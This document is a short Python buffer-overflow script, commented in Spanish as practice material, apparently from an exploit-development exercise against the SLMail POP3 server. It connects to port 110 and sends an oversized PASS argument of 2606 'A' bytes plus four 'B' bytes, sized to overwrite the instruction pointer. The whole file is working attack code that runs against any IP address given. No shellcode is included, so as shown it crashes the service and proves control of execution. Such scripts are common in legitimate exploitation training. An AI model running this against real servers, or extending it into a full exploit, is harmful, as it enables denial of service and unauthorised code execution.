#!/usr/bin/python
# Bof a Slmail para practicas en python3
from pwn import *
import socket, sys

def exploit(ip_address, rport):
    buffer = "A" * 2606 + "B" * 4
    
    p1 = log.progress("Data")
    try:
        p1.status("Enviando %s bytes" % len(buffer))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        s.recv(1024)
        s.send(b'USER eva\r\n')
        s.recv(1024)
        s.send(b'PASS ' + buffer.encode('utf-8') + b'\r\n')
        s.recv(1024)
    except Exception as e:
        print("\n[!] Ha habido un error de conexión:", e)
        sys.exit(0)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print ("\n[!] Uso : python " + sys.argv[0] + " <ip-address>\n")
        sys.exit(0)

    ip_address = sys.argv[1]
    rport = 110

    exploit(ip_address, rport)